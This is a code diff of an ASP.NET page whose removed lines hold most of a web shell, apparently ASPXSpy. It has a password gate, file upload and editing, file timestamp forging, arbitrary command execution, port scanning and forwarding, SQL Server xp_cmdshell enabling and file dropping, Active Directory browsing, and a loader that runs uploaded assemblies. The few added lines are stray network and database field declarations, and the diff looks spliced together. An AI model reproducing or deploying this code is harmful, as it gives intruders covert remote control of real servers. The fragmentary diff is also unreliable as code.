-		tr.Cells.Add(tc);
-		tc=new TableCell();
-		tc.Text=objfile.LastWriteTime.ToString();
-		tr.Cells.Add(tc);
-		tc=new TableCell();
-		tc.Text=Bin_FileSize(objfile.Length);
-		tr.Cells.Add(tc);
-		Bin_Table_Search.Rows.Add(tr);
-	}
-	private void Bin_Msg(string instr)
-	{
-		Bin_Div_Msg.Visible=true;
-		Bin_Div_Msg.InnerHtml="<pre><xmp>"+instr+"</xmp></pre>";
-	}
-	private void zcg_ShowError(Exception ex)
-	{
-		if(ex.InnerException==null){Bin_Msg(ex.Message);}else{Bin_Msg(ex.ToString());}
-	}
-	protected void Bin_Button_Login_Click(object sender,EventArgs e)
-	{
-		string MD5Pass=FormsAuthentication.HashPasswordForStoringInConfigFile(Bin_TextBox_Login.Text,"MD5").ToLower();
-		if(MD5Pass==Password)
-		{
-			Response.Cookies.Add(new HttpCookie(Version,Password));
-			Bin_Div_Login.Visible=false;
-			Bin_Main();
-		}
-		else
-		{
-			Bin_Login();
-		}
-	}
-	protected void Bin_Button_File_Click(object sender,EventArgs e)
-	{
-		Bin_File(Server.MapPath("."));
-	}
-	protected void Bin_Button_IISspy_Click(object sender,EventArgs e)
-	{
-		Bin_H2_Title.InnerText="IIS Spy >>";
-		Hide_Div();
-		Bin_Div_IISSpy.Visible=true;
-		Bin_Table_IISSpy.Style.Add("word-break","break-all");
-		try{Bin_WMI_IISSpy();}catch{try{Bin_IISSpy();}catch(Exception ex){zcg_ShowError(ex);}}
-	}
-	protected void Bin_Button_Save_Click(object sender,EventArgs e)
-	{
-		try
-		{
-			StreamWriter sw;
-			if(Bin_List_Code.SelectedItem.Text=="UTF-8")
-			{
-				sw=new StreamWriter(Bin_TextBox_Fp.Value,false,Encoding.UTF8);
-			}
-			else
-			{
-				sw=new StreamWriter(Bin_TextBox_Fp.Value,false,Encoding.Default);
-			}
-			sw.Write(Bin_Textarea_Edit.InnerText);
-			sw.Close();
-			Bin_Msg("Save file success !");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_Upload_Click(object sender,EventArgs e)
-	{
-		string uppath=Bin_TextBox_Path.Value;
-		uppath=Bin_PathBuild(uppath);
-		try
-		{
-			if(Bin_Lable_File.PostedFile.FileName==""){Bin_Msg("No file to upload");}
-			else{Bin_Lable_File.PostedFile.SaveAs(uppath+Path.GetFileName(Bin_Lable_File.Value));Bin_Msg("File upload success!");}
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_Go_Click(object sender,EventArgs e)
-	{
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_WebRoot_Click(object sender,EventArgs e)
-	{
-		Bin_File(Server.MapPath("."));
-	}
-	protected void Bin_Button_Clone_Click(object sender,EventArgs e)
-	{
-		try
-		{
-			File.SetCreationTimeUtc(Bin_TextBox_Sp.Value,File.GetCreationTimeUtc(Bin_TextBox_Dp.Value));
-			File.SetLastAccessTimeUtc(Bin_TextBox_Sp.Value,File.GetLastAccessTimeUtc(Bin_TextBox_Dp.Value));
-			File.SetLastWriteTimeUtc(Bin_TextBox_Sp.Value,File.GetLastWriteTimeUtc(Bin_TextBox_Dp.Value));
-			Bin_Msg("File time clone success!");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_Att_Click(object sender,EventArgs e)
-	{
-		string path=Bin_TextBox_Sp1.Value;
-		try
-		{
-			File.SetAttributes(path,FileAttributes.Normal);
-			if(Bin_CheckBox_ReadOnly.Checked)
-			{
-				File.SetAttributes(path,FileAttributes.ReadOnly);
-			}
-			if(Bin_CheckBox_System.Checked)
-			{
-				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
-			}
-			if(Bin_CheckBox_Hiddent.Checked)
-			{
-				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
-			}
-			if(Bin_CheckBox_Archive.Checked)
-			{
-				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
-			}
-			File.SetCreationTimeUtc(path,Convert.ToDateTime(Bin_TextBox_Creation.Value));
-			File.SetLastAccessTimeUtc(path,Convert.ToDateTime(Bin_TextBox_LastAccess.Value));
-			File.SetLastWriteTimeUtc(path,Convert.ToDateTime(Bin_TextBox_LastWrite.Value));
-			Bin_Msg("File attributes modify success!");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_Cmd_Click(object sender,EventArgs e)
-	{
-		Hide_Div();
-		Bin_Div_Cmd.Visible=true;
-		Bin_H2_Title.InnerText="Execute Command >>";
-	}
-	protected void Bin_Button_CmdExec_Click(object sender,EventArgs e)
-	{
-		try{zcg_ExecCmd();}
-		catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private void zcg_ExecCmd()
-	{
-		try
-		{
-			Process Cmdpro=new Process();
-			Cmdpro.StartInfo.FileName=Bin_TextBox_CmdPath.Value;
-			Cmdpro.StartInfo.Arguments=Bin_TextBox_CmdArg.Value;
-			Cmdpro.StartInfo.UseShellExecute=false;
-			Cmdpro.StartInfo.RedirectStandardInput=true;
-			Cmdpro.StartInfo.RedirectStandardOutput=true;
-			Cmdpro.StartInfo.RedirectStandardError=true;
-			Cmdpro.Start();
-			string cmdstr=Cmdpro.StandardOutput.ReadToEnd();
-            cmdstr+=Cmdpro.StandardError.ReadToEnd();
-			Bin_Div_CmdRes.Visible=true;
-			Bin_Div_CmdRes.InnerHtml="<hr width=\"100%\" noshade/><pre><xmp>"+cmdstr+"</xmp></pre>";
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-	}
-	protected void Bin_Bin_RegreadButton_Click(object sender,EventArgs e)
-	{
-		if(Bin_Text_Regread.Text.Length>0)
-		{
-			Bin_ShowReg(Bin_Text_Regread.Text);
-		}
-		else
-		{
-			RegInit();
-		}
-	}
-	protected void Bin_Button_Process_Click(object sender,EventArgs e)
-	{
-		zcg_ProcessHeader();
-		try{Bin_Wmi_GetProcess();}catch{try{Bin_GetProcess();}catch(Exception ex){zcg_ShowError(ex);}}
-	}
-	private void zcg_ProcessHeader()
-	{
-		Bin_H2_Title.InnerText="Process >>";
-		Hide_Div();
-		Bin_Div_Process.Visible=true;
-	}
-	protected void Bin_Button_Services_Click(object sender,EventArgs e)
-	{
-		Bin_H2_Title.InnerText="Services >>";
-		Hide_Div();
-		Bin_Div_Services.Visible=true;
-		try{Bin_Wmi_GetServices();}catch{try{Bin_GetServices();}catch(Exception ex){zcg_ShowError(ex);}}
-	}
-	protected void Bin_Button_Sysinfo_Click(object sender,EventArgs e)
-	{
-		Bin_Sysinfo();
-	}
-	protected void Bin_Button_Userinfo_Click(object sender,EventArgs e)
-	{
-		Hide_Div();
-		Bin_Div_Userinfo.Visible=true;
-		Bin_H2_Title.InnerText="User Information >>";
-		try{Bin_Wmi_UserInfo();}catch{try{Bin_UserInfo();}catch(Exception ex){zcg_ShowError(ex);}}
-	}
-	protected void Bin_Button_Reg_Click(object sender,EventArgs e)
-	{
-		Bin_Reg();
-	}
-	protected void Bin_Button_DB_Click(object sender,EventArgs e)
-	{
-		Bin_DataBase();
-	}
-	protected void Bin_List_SelectedIndexChanged(object sender,EventArgs e)
-	{
-		switch(((Control)sender).ID.ToString())
-		{
-			case "Bin_List_Connstr":
-				Bin_Div_DBPanel.Visible=false;
-				Bin_TextBox_ConnStr.Text=Bin_List_Connstr.SelectedItem.Value.ToString();
-				break;
-			case "Bin_Button_Show":
-			case "Bin_List_DB":
-				Bin_DataBind();
-				break;
-			case "Bin_List_Exec":
-                string selectstr=Bin_List_Exec.SelectedItem.Value.ToString();
-                if (selectstr == "SA_Upfile")
-                {
-                    Bin_Div_saupfile.Visible=true;
-                }
-                else if (selectstr == "FileCopy")
-                {
-                    Bin_Div_CopyFile.Visible = true;
-                }
-                else
-                {
-                    Bin_Textarea_Query.InnerText = selectstr;
-                }
-				break;
-			case "Bin_List_Code":
-				Bin_CreateFile(Bin_TextBox_Fp.Value);
-				break;
-		}
-	}
-	protected void Bin_Button_Back_Click(object sender,EventArgs e)
-	{
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	protected void Bin_Button_Conn_Click(object sender,EventArgs e)
-	{
-		Bin_Newconn();
-	}
-	protected void Bin_Button_PortScan_Click(object sender,EventArgs e)
-	{
-		Bin_PortScan();
-	}
-	protected void Bin_Button_PortMap_Click(object sender,EventArgs e)
-	{
-		Bin_PortMap();
-	}
-    protected void Bin_Button_WmiTools_Click(object sender, EventArgs e)
-    {
-        Bin_WmiTools();
-    }
-	protected void zcg_btnListPM_Click(object sender,EventArgs e)
-	{
-		try{
-		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
-		{
-			Bin_Msg("List is empty.");
-		}else{
-		zcg_tbl_PMList.Visible=true;
-		Hashtable ht=Session[PMCacheName] as Hashtable;
-		int count=0,connected=0,closed=0;
-		foreach(DictionaryEntry de in ht)
-			{
-				PortForward pf=de.Value as PortForward;
-				if(pf!=null){
-				count++;
-				TableRow tr=zcg_GetTableRow();
-				TableCell tc=new TableCell();
-				tc.Text=de.Key.ToString();
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text=string.Format("{0}:{1}",pf.RemoteAddress,pf.RemotePort);
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text=string.Format("{0}:{1}",pf.LocalAddress,pf.LocalPort);
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				if(pf.IsConnected){tc.Text="Connected";connected++;}
-				else{tc.Text="Closed";closed++;}
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text="<a href=\"javascript:Bin_PostBack('zcg_ClosePM','"+Bin_ToBase64(de.Key.ToString())+"')\">Close</a>";
-				tr.Cells.Add(tc);
-				zcg_tbl_PMList.Rows.Add(tr);}
-			}if(count==0){Bin_Msg("List is empty.");}else{Bin_Msg(string.Format("Total {0} PortMap(s) cached ,{1} Connected ,{2} Closed",count,connected,closed));}
-		}
-		}catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private void zcg_ClosePM(string id)
-	{
-		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
-		{
-			Bin_Msg("List is empty.");
-		}else{
-		Hashtable ht=Session[PMCacheName] as Hashtable;
-		PortForward pf=ht[id] as PortForward;
-		if(pf!=null){pf.Stop();ht.Remove(id);}
-		zcg_btnListPM_Click(null,null);Bin_Msg("PortMap of ID:"+id+" Closeed.");
-		}
-	}
-	protected void zcg_btnClearPM_Click(object sender,EventArgs e)
-	{
-		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
-		{
-			Bin_Msg("List is empty.");
-		}else{
-		Hashtable ht=Session[PMCacheName] as Hashtable;
-		foreach(DictionaryEntry de in ht)
-			{
-				PortForward pf=de.Value as PortForward;
-				if(pf!=null){pf.Stop();}
-			}
-		ht.Clear();Bin_Msg("All PortMap(s) closed");
-		}
-	}
-	protected void Bin_Button_MapPort_Click(object sender,EventArgs e)
-	{
-		try{
-		if(Bin_TextBox_Lport.Value=="" || Bin_TextBox_Lip.Value.Length<7 || Bin_TextBox_Rport.Value=="")return;
-		int rport=int.Parse(Bin_TextBox_Rport.Value);
-		int lport=int.Parse(Bin_TextBox_Lport.Value);
-		PortForward pf=new PortForward();
-		pf.Start(Bin_TextBox_Rip.Value,rport,Bin_TextBox_Lip.Value,lport);
-		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
-		{
-			try{Session[PMCacheName]=new Hashtable();}catch{Bin_Msg("Session not enable,List while unavailable");}
-		}
-		string s=Guid.NewGuid().ToString();
-		Hashtable ht=Session[PMCacheName] as Hashtable;
-		ht[s]=pf;
-		Bin_Msg(String.Format("PortMap of ID: {0} Started.",s));
-		}catch(Exception ex){zcg_ShowError(ex);}
-	}
-	protected void Bin_Button_Scan_Click(object sender,EventArgs e)
-	{
-		ArrayList ScanResults=new ArrayList();
-		try
-		{
-			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,Bin_TextBox_Sip.Text,-1).Demand();
-			string[] ports=Bin_TextBox_Sport.Text.Split(',');
-			for(int i=0;i<ports.Length;i++)
-			{
-				int p=0;
-				if(Int32.TryParse(ports[i],out p)){ScanResults.Add(new ScanPort(Bin_TextBox_Sip.Text,p));}
-			}
-			Thread[] lThreads=new Thread[ScanResults.Count];
-			int idx=0;
-			for(idx=0;idx<ScanResults.Count;idx++)
-			{
-				lThreads[idx]=new Thread(new ThreadStart(((ScanPort)ScanResults[idx]).Scan));
-				lThreads[idx].Start();
-			}
-			for(idx=0;idx<lThreads.Length;idx++){lThreads[idx].Join();}
-		}
-		catch(SocketException){Bin_Msg("Host not found.");}
-		catch(Exception ex){zcg_ShowError(ex);}
-		Bin_Label_Scanres.Visible=true;
-		string res="";
-		foreach(ScanPort th in ScanResults){res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";}
-		Bin_Label_Scanres.InnerHtml=res;
-	}
-	protected void Bin_Button_Query_Click(object sender,EventArgs e)
-	{
-		Bin_Button_Export.Visible=true;
-		Bin_ExecBind();
-	}
-	protected void Bin_Button_Export_Click(object sender,EventArgs e)
-	{
-		try
-		{
-			OpenConnection();
-			if(Bin_List_Connstr.SelectedItem.Text=="MSSQL")
-			{
-				if(Bin_List_DB.SelectedItem.Value!="")
-				{
-					conn.ChangeDatabase(Bin_List_DB.SelectedItem.Value.ToString());
-				}
-			}
-			DataTable dt=Bin_DataTable(Bin_Textarea_Query.InnerText);
-			string fname="Query.xls";
-			Match mat=Regex.Match(Bin_Textarea_Query.InnerText,@"(?<= from \[?)[\w.]+");
-			if (mat.Success)
-			{
-				fname=mat.Value+".xls";
-			}
-			if (dt.Columns.Count>0)
-			{
-				Response.AddHeader("Content-Disposition","attachment;filename="+fname);
-				Response.ContentType="application/ms-excel";
-				{
-					Response.Write("<table border=1><tr>\r\n");
-					foreach(DataColumn subcol in dt.Columns)
-					{
-						Response.Write("<td><b>"+subcol.ColumnName+"</b></td>");
-					}
-					Response.Write("</tr>");
-					foreach(DataRow subrow in dt.Rows)
-					{
-						Response.Write("<tr>");
-						for (int i=0;i<subrow.ItemArray.Length;i++)
-						{
-							Response.Write("<td>"+subrow.ItemArray[i].ToString()+"</td>");
-						}
-						Response.Write("</tr>");
-					}
-					Response.Write("</table>\r\n");
-				}
-				Response.End();
-			}
-			else{Bin_Msg("No data!");}
-		}
-		catch (Exception ex){zcg_ShowError(ex);}
-	}
-    protected void Bin_Button_SaUpfile_Click(object sender, EventArgs e)
-    {
-        Bin_Div_saupfile.Visible=true;
-        Bin_ExecSql("IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp");
-        Bin_ExecSql("IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp");
-        string strfrm="8.0|1|1       SQLIMAGE      0       0       \"\"                        1     safile     \"\"";
-        Bin_ExecSql("CREATE TABLE bin_temp(safile image)");
-        Byte[] b = new byte[Bin_TextBox_SaFile.PostedFile.InputStream.Length];
-        Stream i = Bin_TextBox_SaFile.PostedFile.InputStream;
-        i.Read(b, 0, b.Length);
-        try
-        {
-            OpenConnection();
-            string db = conn.Database;
-            comm.CommandText = "insert into [bin_temp] values(@P1);";
-			DbParameter dp=new SqlParameter("@P1", SqlDbType.Image);
-			dp.Value = b;
-            comm.Parameters.Add(dp);
-            comm.ExecuteNonQuery();
-            string verstr = Bin_DataTable(@"SELECT @@VERSION").Rows[0][0].ToString();
-            if (verstr.IndexOf("2005") > 0)
-            {
-                strfrm.Replace("8.0", "9.0");
-                Bin_ExecSql("EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;");
-            }
-            string[] arrfrm = strfrm.Split('|');
-            foreach (string substrfrm in arrfrm)
-            {
-                Bin_ExecSql("EXEC master..xp_cmdshell 'echo " + substrfrm + " >> c:\\windows\\temp\\tmp.fmt'");
-            }
-            Bin_ExecSql("exec master..xp_cmdshell'bcp \"select safile from " + db + "..bin_temp\" queryout \"" + Bin_TextBox_SavePath.Value + "\" -T -f c:\\windows\\temp\\tmp.fmt'");
-            Bin_ExecSql("If object_id('bin_temp')is not null drop table bin_temp");
-            Bin_ExecSql("EXECUTE master..xp_cmdshell 'del c:\\windows\\temp\\tmp.fmt'");
-            string res = Bin_DataTable("EXECUTE master..xp_fileexist '" + Bin_TextBox_SavePath.Value + "'").Rows[0][0].ToString();
-            if (res == "1")
-            {
-                Bin_Msg("File uploaded,Good Luck!");
-            }
-            else{Bin_Msg("Upload failed,Sorry!");}
+protected OleDbCommand Kkvb=new OleDbCommand();
 
-        }
-        catch (Exception ex)
-        {
-            zcg_ShowError(ex);
-        }
-    }
+public NetworkStream NS=null;
 
-    protected void Bin_Button_CabCopy_Click(object sender, EventArgs e)
-    {
-        Bin_Div_CopyFile.Visible = true;
-        try
-        {
-            IDictionary dic = Environment.GetEnvironmentVariables();
-            string tmppath = dic["TMP"].ToString();
-            if(Bin_ExecSql("exec master..xp_makecab '" + tmppath + "\\~098611.tmp','default',1,'" + Bin_TextBox_Source.Value + "';exec master..xp_unpackcab '" + tmppath + "\\~098611.tmp','" + Path.GetDirectoryName(Bin_TextBox_Target.Value) + "',1,'" + Path.GetFileName(Bin_TextBox_Target.Value) + "'")){Bin_Msg("File Copyed,Good Luck!");}
-        }
-        catch (Exception ex)
-        {
-            zcg_ShowError(ex);
-        }
-    }
+public NetworkStream NS1=null;
 
-    protected void Bin_Button_FsoCopy_Click(object sender, EventArgs e)
-    {
-        Bin_Div_CopyFile.Visible = true;
-        try
-        {
-            if(Bin_ExecSql("declare @a int;exec master..sp_oacreate'Scripting.FileSystemObject',@a output;exec master..sp_oamethod @a,'CopyFile',null,'" + Bin_TextBox_Source.Value + "','" + Bin_TextBox_Target.Value+ "'")){     Bin_Msg("File Copyed,Good Luck!");}
-        }
-        catch (Exception ex)
-        {
-            Bin_Msg(ex.Message);
-        }
+TcpClient tcp=new TcpClient();
 
-    }
-    protected void Bin_Button_WmiQuery_Click(object sender, EventArgs e)
-    {
-        if (Bin_TextBox_WmiString.Text != "")
-        {
-            Bin_Div_WmiPanel.Visible = true;
-            try
-            {
-				Bin_DataGrid_Wmi.PreRender+=new EventHandler(DataGrid_PreRender);
-				if(string.IsNullOrEmpty(zcg_txbWmiComputer.Text))
-				{
-					Bin_DataGrid_Wmi.DataSource=zcg_WmiDataTable(zcg_txbWmiNamespace.Text,Bin_TextBox_WmiString.Text);
-				}
-				else
-				{
-					Bin_DataGrid_Wmi.DataSource=zcg_WmiDataTable(zcg_txbWmiComputer.Text,zcg_txbWmiUserName.Text,zcg_txbWmiPassword.Text,zcg_txbWmiNamespace.Text,Bin_TextBox_WmiString.Text);
-				}
-				Bin_DataGrid_Wmi.DataBind();
-				for(int i=0;i<Bin_DataGrid_Wmi.Items.Count;i++)
-				{
-					zcg_SetControlAttribute(Bin_DataGrid_Wmi.Items[i]);
-				}
-            }
-            catch (Exception ex)
-            {
-                zcg_ShowError(ex);
-            }
-        }
-    }
+TcpClient zvxm=new TcpClient();
 
-	[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
-	private static extern bool LookupAccountName(string machineName, string accountName, byte[] sid, ref int sidLen, StringBuilder domainName, ref int domainNameLen, out int peUse);
-	private string zcg_GetCurrentDomain()
-	{
-		try{return zcg_WmiDataTable("root\\CIMV2","select Domain from Win32_ComputerSystem").Rows[0]["Domain"] as string;}
-		catch{
-			try{string s = Environment.UserDomainName;
-			int num3;
-			byte[] sid = new byte[0x400];
-			int length = sid.Length;
-			StringBuilder domainName = new StringBuilder(0x400);
-			int capacity = domainName.Capacity;
-			if(!string.Equals(s,"NT AUTHORITY"))
-			{
-				return s;
-			}
-			else if (LookupAccountName(null, DomainUserName, sid, ref length, domainName, ref capacity, out num3))
-			{
-				return domainName.ToString();
-			}return Environment.MachineName;}catch{return Environment.MachineName;}
-		}
-	}
-	protected void zcg_lbtnADSViewer_Click(object sender,EventArgs e)
-    {
-        Hide_Div();
-		try{
-        zcg_div_ADSViewer.Visible = true;
-		zcg_lbtnADSLocalMachine.CommandArgument="WinNT://"+Environment.MachineName;
-		zcg_lbtnADSCurrentDomain.CommandArgument="WinNT://"+zcg_GetCurrentDomain();
-		}catch(Exception ex){zcg_ShowError(ex);}
-        Bin_H2_Title.InnerText = "ADS Viewer >>";
-    }
-	protected void zcg_btnDoListADS_Click(object sender,EventArgs e)
-	{
-		if(!string.IsNullOrEmpty(zcg_txbADSPath.Value.Trim()))
-		{
-			try{
-				if(!string.IsNullOrEmpty(zcg_txbADSFilter.Value.Trim()))
-				{
-					zcg_SearchADSChildren(zcg_txbADSPath.Value.Trim(),zcg_txbADSFilter.Value.Trim(),zcg_txbADSUser.Value.Trim(),zcg_txbADSPass.Value,zcg_txbADSType.Value);
-				}else{
-				zcg_EnumADSChildrenAndListProperties(zcg_txbADSPath.Value.Trim(),zcg_txbADSUser.Value.Trim(),zcg_txbADSPass.Value,zcg_txbADSType.Value);
-				}
-			}
-			catch(Exception ex){zcg_ShowError(ex);}
-		}
-	}
-	protected void zcg_lbtnADS_Click(object sender,EventArgs e)
-	{
-		string ADSPath=(sender as LinkButton).CommandArgument;
-		zcg_txbADSPath.Value=ADSPath;
-		try{zcg_EnumADSChildrenAndListProperties(ADSPath,null,null,zcg_txbADSType.Value);}
-		catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private void zcg_SearchADSChildren(string ADSPath,string ADSFilter,string ADSUserName,string ADSPassWord,string AuthType)
-	{
-		DirectorySearcher ds=null;
-		SearchResultCollection sc=null;
-		try
-		{
-			new DirectoryServicesPermission(DirectoryServicesPermissionAccess.Browse,ADSPath).Demand();
-			AuthenticationTypes t=(AuthenticationTypes)(Convert.ToInt32(AuthType));
-			DirectoryEntry dire=null;
-			TableCell tc=null;
-			if(!string.IsNullOrEmpty(ADSUserName))
-			{
-				dire=new DirectoryEntry(ADSPath,ADSUserName,ADSPassWord,t);
-			}
-			else
-			{
-				dire=new DirectoryEntry(ADSPath);
-				dire.AuthenticationType=t;
-			}
-			zcg_lbl_Schema.Text="SearchResult";
-			ds=new DirectorySearcher(dire,ADSFilter);
-			sc=ds.FindAll();
-			foreach(SearchResult sr in sc)
-			{
-				TableRow tr=zcg_GetTableRow();
-				tc=new TableCell();
-				tc.Text=zcg_MakeADSLinkJs(sr.Path);
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text="Search Result Entry";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text="Unknown";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text="--";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text=zcg_MakeADSLinkJs(sr.Path);
-				tr.Cells.Add(tc);
-				zcg_tbl_ADSViewer.Rows.Add(tr);
-			}
-		}
-		catch(Exception ex)
-		{
-			zcg_ShowError(ex);
-		}
-		finally
-		{
-			if(ds!=null){ds.Dispose();}
-			if(sc!=null){sc.Dispose();}
-		}
-	}
-	private void zcg_EnumADSChildrenAndListProperties(string ADSPath,string ADSUserName,string ADSPassWord,string AuthType)
-	{
-		try
-		{
-			new DirectoryServicesPermission(DirectoryServicesPermissionAccess.Browse,ADSPath).Demand();
-			AuthenticationTypes t=(AuthenticationTypes)(Convert.ToInt32(AuthType));
-			DirectoryEntry dire=null;
-			DirectoryEntry parent=null;
-			TableCell tc=null;
-			if(!string.IsNullOrEmpty(ADSUserName))
-			{
-				dire=new DirectoryEntry(ADSPath,ADSUserName,ADSPassWord,t);
-			}
-			else
-			{
-				dire=new DirectoryEntry(ADSPath);
-				dire.AuthenticationType=t;
-			}
-			try{zcg_lbl_Schema.Text=dire.SchemaClassName;}catch{zcg_lbl_Schema.Text="Unknown";}
-			parent=dire.Parent;
-			if(!string.Equals(parent.Path,"ADs:"))
-			{
-				TableRow tr=zcg_GetTableRow();
-				tc=new TableCell();
-				tc.Text=zcg_MakeADSLinkJs(dire.Parent.Path,"Parent DirectoryEntry");
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text="Parent Entry";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				try
-				{
-					tc.Text=parent.SchemaClassName;
-					tr.Cells.Add(tc);
-				}
-				catch
-				{
-					tc.Text="Unknown";
-					tr.Cells.Add(tc);
-				}
-				tc=new TableCell();
-				tc.Text="--";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Text=zcg_MakeADSLinkJs(parent.Path);
-				tr.Cells.Add(tc);
-				zcg_tbl_ADSViewer.Rows.Add(tr);
-			}
-			foreach (DirectoryEntry child in dire.Children)
-			{
-				try
-				{
-					TableRow tr=zcg_GetTableRow();
-					tc=new TableCell();
-					tc.Text=zcg_MakeADSLinkJs(child.Path,child.Name);
-					tr.Cells.Add(tc);
-					tc=new TableCell();
-					tc.Text="Child Entry";
-					tr.Cells.Add(tc);
-					try
-					{
-						tc=new TableCell();
-						tc.Text=child.SchemaClassName;
-						tr.Cells.Add(tc);
-					}
-					catch
-					{
-						tc=new TableCell();
-						tc.Text="Unknown";
-						tr.Cells.Add(tc);
-					}
-					tc=new TableCell();
-					tc.Text="--";
-					tr.Cells.Add(tc);
-					tc=new TableCell();
-					tc.Text=zcg_MakeADSLinkJs(child.Path);
-					tr.Cells.Add(tc);
-					zcg_tbl_ADSViewer.Rows.Add(tr);
-				}
-				catch{}
-			}
-			TableRow intr=new TableRow();
-			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
-			intr.Attributes["bgcolor"]="#dddddd";
-			TableCell intc=new TableCell();
-			intc.Attributes["colspan"]="6" ;
-			intc.Attributes["height"]="5";
-			intr.Cells.Add(intc);
-			zcg_tbl_ADSViewer.Rows.Add(intr);
-			System.DirectoryServices.PropertyCollection pc=dire.Properties;
-			foreach(object o in pc.PropertyNames)
-			{
-				try
-				{
-					if(o is string)
-					{
-						string tmps=null;
-						object prop=pc[o as string].Value;
-						if(prop is Array)
-						{
-							foreach(object op in prop as Array)
-							{
-								if(op is byte)
-								{
-									tmps+=((byte)op).ToString("X2");
-								}
-								else
-								{
-									tmps+=op.ToString();
-									tmps+="<br />";
-								}
-							}
-						}
-						else
-						{
-							tmps=prop.ToString();
-						}
-						TableRow tr=zcg_GetTableRow();
-						tc=new TableCell();
-						tc.Text=o as string;
-						tr.Cells.Add(tc);
-						tc=new TableCell();
-						tc.Text="Property";
-						tr.Cells.Add(tc);
-						tc=new TableCell();
-						tc.Text="--";
-						tr.Cells.Add(tc);
-						tc=new TableCell();
-						tc.Text=tmps;
-						tr.Cells.Add(tc);
-						tc=new TableCell();
-						tc.Text="--";
-						tr.Cells.Add(tc);
-						zcg_tbl_ADSViewer.Rows.Add(tr);
-					}
-				}catch{}
-			}
-		}
-		catch(Exception ex)
-		{
-			zcg_ShowError(ex);
-		}
-	}
-	private string zcg_MakeADSLinkJs(params string[] ADSSettings)
-	{
-		if(ADSSettings.GetLength(0)>1)
-		{
-			return string.Format("<a href=\"javascript:Bin_PostBack('zcg_ListADS','{0}')\">{1}</a>",Bin_ToBase64(ADSSettings[0]),ADSSettings[1]);
-		}
-		return string.Format("<a href=\"javascript:Bin_PostBack('zcg_ListADS','{0}')\">{1}</a>",Bin_ToBase64(ADSSettings[0]),ADSSettings[0]);
-	}
-	protected void zcg_lbtnPlugin_Click(object sender,EventArgs e)
-	{
-		Hide_Div();
-        zcg_div_Plugin.Visible = true;
-        Bin_H2_Title.InnerText = "Plugin Loader >>";
-	}
-	protected void zcg_btnplgLoad_Click(object sender,EventArgs e)
-	{
-		zcg_div_PluginResult.InnerHtml="";
-		try
-		{
-			if(zcg_plgFile.PostedFile.ContentLength==0){Bin_Msg("No Plugin Selected");}
-			else
-			{
-				Stream stream=null;MemoryStream mem=new MemoryStream();byte[] b = new byte[2048];int i = 0;
-				if(zcg_chbIsDeflated.Checked){stream=new DeflateStream(zcg_plgFile.PostedFile.InputStream, CompressionMode.Decompress);}
-				else{stream=zcg_plgFile.PostedFile.InputStream;}
-				do{i = stream.Read(b, 0, 2048);mem.Write(b, 0, i);} while (i != 0);
-				stream.Close();b=mem.ToArray();mem.Close();
-				string TypeName=string.IsNullOrEmpty(zcg_txbTypeName.Text)?"Zcg.Test.AspxSpyPlugins.TestPlugin":zcg_txbTypeName.Text;
-				string MethodName=string.IsNullOrEmpty(zcg_txbMethodName.Text)?"Test":zcg_txbMethodName.Text;
-				Type t=Assembly.Load(b).GetType(TypeName);
-				if(t==null){Bin_Msg("Type "+TypeName+" Not Found");}
-				else{zcg_div_PluginResult.InnerHtml=String.Format("Result :<hr width=\"100%\" noshade/>"+(zcg_chbIsHtml.Checked?"{0}":"<pre><xmp>{0}</xmp></pre>"),t.InvokeMember(MethodName,BindingFlags.InvokeMethod|BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static,null,null,new object[]{zcg_txbParams.Text.Split(new string[1]{"\r\n"},StringSplitOptions.RemoveEmptyEntries)}));zcg_div_PluginResult.Visible=true;}
-			}
-		}
-		catch(Exception ex){zcg_ShowError(ex);}//to see InnerException
-	}
-</script>
-<html xmlns="http://www.w3.org/1999/xhtml" >
-<head id="Head1" runat="server">
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
-<title><%=Version + " - " +Request.ServerVariables["SERVER_NAME"]%></title>
-<style type="text/css">
